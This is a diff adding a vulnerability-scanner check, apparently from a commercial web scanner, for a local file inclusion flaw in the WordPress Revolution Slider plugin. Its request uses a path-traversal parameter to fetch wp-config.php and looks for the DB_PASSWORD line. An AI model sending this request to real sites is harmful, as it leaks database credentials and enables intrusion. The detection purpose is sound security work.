@@ -1,0 +1,35 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************
+function alert(fname, job, affects, pattern)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = affects;
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(job);	
+	ri.Details =  ri.Details + "wp-config.php pattern found: [dark]" + pattern + "[/dark]";	
+	
+	AddReportItem(ri);
+}
+// **************************************************************************************
+function test_revslider_lfi(dir, path, zipFile){
+	if (!path.endsWith('/')) path = path + '/';	
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'GET';
+	http.uri = path + 'wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
+	
+	http.execute();	
+	
+	var patternStr = "define('DB_PASSWORD',";
+	
+	if (!http.wasError && http.response.body.indexOf(patternStr) != -1){
+		alert("WordPress_revslider_lfi.xml", http, path + "wp-admin/admin-ajax.php", patternStr);
+	}			
+}
+var dir = getCurrentDirectory();
+test_revslider_lfi(dir, dir.fullPath);
